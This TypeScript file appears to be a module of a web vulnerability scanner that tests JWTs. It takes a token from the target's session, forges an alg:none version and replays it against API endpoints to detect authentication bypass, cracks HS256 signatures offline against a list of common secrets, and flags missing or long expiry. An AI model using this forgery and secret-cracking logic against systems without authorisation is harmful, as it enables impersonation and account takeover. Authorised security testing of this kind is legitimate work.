// JWT weakness scanner (web2-vuln-classes SKILL / argus JWT suite port).
//
// Needs a REAL token to test. It harvests one from the target's own session —
// a BEARER TargetCredential, a JWT-shaped cookie value, or a JWT observed in the
// authenticated crawl corpus — and if none is found it skips cleanly (the app
// may simply not use JWTs). Three checks:
//
//   1. alg:none forgery (NETWORK) — rebuild the token with `alg:"none"` and an
//      empty signature, replay it against a protected endpoint, and confirm by
//      CONTENT CONSISTENCY (same discipline as the auth-bypass fix): PROVEN only
//      if the forged request returns authenticated-looking content that the
//      anonymous baseline does NOT — never on an HTTP code alone. -> CRITICAL.
//   2. weak HMAC secret (OFFLINE, no network) — if HS256, recompute the
//      signature locally over a small list of common secrets. A match is direct
//      mathematical proof the signing key is guessable. -> CRITICAL. The secret
//      is written ONLY into the finding (protected by the app's own auth), never
//      into the general scan logs.
//   3. expiry audit (OFFLINE) — missing `exp`, or a validity window > 30 days,
//      is a hardening observation, not an exploit. -> CANDIDATE / LOW.
//
// Never throws; bounded request volume; no destructive requests (GET only).

import { createHmac, timingSafeEqual } from "node:crypto";
import type { ScanContext } from "./context";
import { logLine, recordFinding } from "./context";
import { probe, type ProbeResult } from "./http";
import { discoverCorpus } from "./discovery";
import { loadTargetCredentials } from "@/server/credentials";

// Small, reasonable secret list for the offline HS256 check — NOT a wordlist.
// The program host/name (lowercased) are appended at runtime.
const COMMON_SECRETS = [
  "secret",
  "changeme",
  "password",
  "jwt_secret",
  "jwtsecret",
  "secretkey",
  "secret_key",
  "your-256-bit-secret",
  "supersecret",
  "admin",
  "test",
  "key",
  "token",
];

const MAX_PROTECTED_ENDPOINTS = 5;
const THIRTY_DAYS_S = 30 * 24 * 60 * 60;

const JWT_RE = /eyJ[A-Za-z0-9_-]{5,}\.eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]*/g;

interface ParsedJwt {
  raw: string;
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signingInput: string; // "<header>.<payload>" as present in the raw token
  signatureB64: string; // third segment (base64url), may be ""
}

/** How the harvested token is carried, so we replay it the same way. */
type Channel =
  | { kind: "bearer" }
  | { kind: "cookie"; name: string; allCookies: Record<string, string> };

function b64urlDecodeToString(seg: string): string | null {
  try {
    return Buffer.from(seg, "base64url").toString("utf8");
  } catch {
    return null;
  }
}

function b64urlEncodeJson(obj: unknown): string {
  return Buffer.from(JSON.stringify(obj), "utf8").toString("base64url");
}

function parseJwt(raw: string): ParsedJwt | null {
  const parts = raw.split(".");
  if (parts.length !== 3) return null;
  const h = b64urlDecodeToString(parts[0]);
  const p = b64urlDecodeToString(parts[1]);
  if (!h || !p) return null;
  let header: unknown;
  let payload: unknown;
  try {
    header = JSON.parse(h);
    payload = JSON.parse(p);
  } catch {
    return null;
  }
  if (!header || typeof header !== "object" || !payload || typeof payload !== "object") {
    return null;
  }
  return {
    raw,
    header: header as Record<string, unknown>,
    payload: payload as Record<string, unknown>,
    signingInput: `${parts[0]}.${parts[1]}`,
    signatureB64: parts[2],
  };
}

const looksEmpty = (body: string): boolean => body.replace(/\s+/g, "").length < 32;
const JSON_ERROR_RE =
  /"(error|errors|message|detail|code)"\s*:|not\s*found|forbidden|unauthoriz|access denied|please (log|sign) ?in/i;
const contentType = (r: ProbeResult): string => (r.headers["content-type"] ?? "").toLowerCase();

/**
 * Decide whether replaying the forged (alg:none) token genuinely bypassed auth.
 * PROVEN only when the forged response is 200, carries real (non-error, non-login)
 * content, and is clearly DISTINCT from the anonymous baseline for the same URL —
 * mirroring the auth-bypass content-consistency rule (never a bare status flip).
 */
function provesAuthBypass(forged: ProbeResult, anon: ProbeResult): { proven: boolean; reason: string } {
  if (forged.status !== 200 || forged.error) {
    return { proven: false, reason: `forged token did not yield 200 (status ${forged.status})` };
  }
  if (looksEmpty(forged.body)) {
    return { proven: false, reason: "forged response body is empty" };
  }
  // If the anonymous baseline already returned the same 200 content, the endpoint
  // wasn't protected — nothing was bypassed.
  const norm = (b: string) => b.replace(/\s+/g, "");
  if (anon.status === 200 && norm(anon.body) === norm(forged.body)) {
    return { proven: false, reason: "endpoint returns identical content anonymously — not protected" };
  }
  const isJson = /application\/json|\+json/.test(contentType(forged));
  if (isJson && JSON_ERROR_RE.test(forged.body.slice(0, 500))) {
    return { proven: false, reason: "forged response is a JSON error/login shell, not authenticated data" };
  }
  // Distinct from the anonymous baseline (which should have been a challenge) AND
  // a non-error body: the forged alg:none token was accepted.
  const anonWasChallenge = anon.status === 401 || anon.status === 403 || (anon.status >= 300 && anon.status < 400);
  if (anonWasChallenge || norm(anon.body) !== norm(forged.body)) {
    return {
      proven: true,
      reason:
        `anonymous request to this endpoint returned ${anon.status} (challenge) while the ` +
        `alg:none-forged token returned 200 with distinct, non-error content`,
    };
  }
  return { proven: false, reason: "could not establish the endpoint was protected; not confirming" };
}

/** Build the request headers that carry `token` over the given channel. */
function headersFor(channel: Channel, token: string): Record<string, string> {
  if (channel.kind === "bearer") return { Authorization: `Bearer ${token}` };
  const cookies = { ...channel.allCookies, [channel.name]: token };
  return { Cookie: Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join("; ") };
}

/** Harvest the first usable JWT + how it is carried. */
async function harvestJwt(
  ctx: ScanContext,
  corpusHtml: string,
): Promise<{ parsed: ParsedJwt; channel: Channel } | null> {
  const creds = await loadTargetCredentials(ctx.targetId).catch(() => []);
  for (const cred of creds) {
    if (cred.bearerToken) {
      const parsed = parseJwt(cred.bearerToken);
      if (parsed) return { parsed, channel: { kind: "bearer" } };
    }
    if (cred.cookies) {
      for (const [name, value] of Object.entries(cred.cookies)) {
        const parsed = parseJwt(value);
        if (parsed) return { parsed, channel: { kind: "cookie", name, allCookies: cred.cookies } };
      }
    }
  }
  // Fall back to a JWT observed in the crawl corpus (e.g. bootstrapped into JS).
  // Channel unknown -> default to Bearer, the common API carrier.
  const m = corpusHtml.match(JWT_RE);
  if (m) {
    for (const raw of m) {
      const parsed = parseJwt(raw);
      if (parsed) return { parsed, channel: { kind: "bearer" } };
    }
  }
  return null;
}

export async function runJwt(ctx: ScanContext): Promise<void> {
  await logLine(ctx.scanRunId, `[jwt] JWT weakness checks on ${ctx.baseUrl}`);

  const corpus = await discoverCorpus(ctx);
  if (!corpus.html) {
    await logLine(ctx.scanRunId, `[jwt] could not crawl ${ctx.baseUrl} — skipping`, "STDERR");
    return;
  }

  const harvested = await harvestJwt(ctx, corpus.html);
  if (!harvested) {
    await logLine(ctx.scanRunId, "[jwt] no JWT found in credentials or crawl corpus — target may not use JWTs; skipping");
    return;
  }
  const { parsed, channel } = harvested;
  const alg = String(parsed.header.alg ?? "").toUpperCase();
  await logLine(
    ctx.scanRunId,
    `[jwt] harvested a JWT (alg=${alg || "?"}, via ${channel.kind}) — running checks`,
  );

  // --- Test 2: weak HMAC secret (OFFLINE, no network). Run first; it's free. ---
  if (alg === "HS256" && parsed.signatureB64) {
    const expected = Buffer.from(parsed.signatureB64, "base64url");
    const candidates = [
      ...COMMON_SECRETS,
      ctx.host.split(":")[0].toLowerCase(),
      ctx.host.split(":")[0].split(".")[0].toLowerCase(),
    ];
    let cracked: string | null = null;
    for (const secret of candidates) {
      if (!secret) continue;
      const actual = createHmac("sha256", secret).update(parsed.signingInput).digest();
      if (actual.length === expected.length && timingSafeEqual(actual, expected)) {
        cracked = secret;
        break;
      }
    }
    if (cracked) {
      // The secret goes ONLY into the finding (protected by the app's auth), never logs.
      await recordFinding(ctx, {
        title: "JWT signed with a guessable HMAC secret (HS256)",
        vulnClass: "JWT Weak Secret",
        severity: "CRITICAL",
        confidence: "PROVEN",
        location: ctx.baseUrl,
        description:
          `The captured HS256 JWT's signature is reproducible with a common secret, proven ` +
          `by recomputing HMAC-SHA256 over the token's signing input offline (no network, ` +
          `no guessing against the server). With the signing key known, an attacker can mint ` +
          `arbitrary valid tokens — forge any user/role for full authentication bypass.\n\n` +
          `Recovered signing secret: "${cracked}"`,
        evidence:
          `alg: HS256\n` +
          `signing input: ${parsed.signingInput.slice(0, 120)}...\n` +
          `secret "${cracked}" reproduces the token signature exactly.`,
      });
      await logLine(ctx.scanRunId, "[jwt] PROVEN weak HMAC secret (secret recorded only in the finding)");
    }
  }

  // --- Test 1: alg:none forgery (NETWORK) against protected endpoints. ---
  const forgedNone = `${b64urlEncodeJson({ ...parsed.header, alg: "none" })}.${b64urlEncodeJson(parsed.payload)}.`;
  // Protected-endpoint candidates: API-ish URLs discovered by the crawl.
  const apiIsh = corpus.urls.filter((u) => /\/(api|v\d+|graphql|account|profile|me|user|admin)s?(\/|$|\?)/i.test(u));
  const endpoints = [...new Set([ctx.baseUrl, ...apiIsh])].slice(0, MAX_PROTECTED_ENDPOINTS);

  for (const url of endpoints) {
    const anon = await probe(url, { timeoutMs: 10_000 });
    const forged = await probe(url, { headers: headersFor(channel, forgedNone), timeoutMs: 10_000 });
    const verdict = provesAuthBypass(forged, anon);
    if (verdict.proven) {
      await recordFinding(ctx, {
        title: `JWT alg:none accepted — authentication bypass @ ${url}`,
        vulnClass: "JWT alg:none Bypass",
        severity: "CRITICAL",
        confidence: "PROVEN",
        location: url,
        description:
          `The endpoint accepts a JWT forged with "alg":"none" and an empty signature — the ` +
          `server does not verify the signature. An attacker can set arbitrary claims (user ` +
          `id, role) and authenticate as anyone. ${verdict.reason}.`,
        evidence:
          `Channel: ${channel.kind}\n` +
          `Anonymous GET ${url} -> ${anon.status} (${anon.bodyLen} bytes)\n` +
          `Forged alg:none GET ${url} -> ${forged.status} (${forged.bodyLen} bytes, ` +
          `content-type ${contentType(forged) || "?"})\n` +
          `Forged token header: {"alg":"none",...}`,
      });
      await logLine(ctx.scanRunId, `[jwt] PROVEN alg:none bypass @ ${url}`);
      break; // one confirmed bypass is enough
    }
  }

  // --- Test 3: expiry audit (OFFLINE). ---
  const exp = typeof parsed.payload.exp === "number" ? parsed.payload.exp : null;
  const iat = typeof parsed.payload.iat === "number" ? parsed.payload.iat : null;
  if (exp === null) {
    await recordFinding(ctx, {
      title: "JWT has no expiry (exp) claim",
      vulnClass: "JWT Excessive Expiry",
      severity: "LOW",
      confidence: "CANDIDATE",
      location: ctx.baseUrl,
      description:
        `The captured JWT carries no "exp" claim, so a leaked or stolen token never expires ` +
        `on its own. Hardening observation, not an exploit — recorded as CANDIDATE. Confirm ` +
        `the server does not enforce expiry out-of-band.`,
      evidence: `payload claims: ${Object.keys(parsed.payload).join(", ") || "(none)"}`,
    });
    await logLine(ctx.scanRunId, "[jwt] CANDIDATE: no exp claim");
  } else {
    const lifetime = iat !== null ? exp - iat : exp - Math.floor(Date.now() / 1000);
    if (lifetime > THIRTY_DAYS_S) {
      const days = Math.round(lifetime / 86400);
      await recordFinding(ctx, {
        title: `JWT validity window is excessive (~${days} days)`,
        vulnClass: "JWT Excessive Expiry",
        severity: "LOW",
        confidence: "CANDIDATE",
        location: ctx.baseUrl,
        description:
          `The captured JWT is valid for roughly ${days} days (> 30-day threshold). A long-lived ` +
          `token widens the window for a stolen token to be abused. Hardening observation, not ` +
          `an exploit — recorded as CANDIDATE.`,
        evidence: `iat=${iat ?? "?"} exp=${exp} (~${days} days)`,
      });
      await logLine(ctx.scanRunId, `[jwt] CANDIDATE: excessive expiry (~${days}d)`);
    }
  }

  await logLine(ctx.scanRunId, "[jwt] done");
}
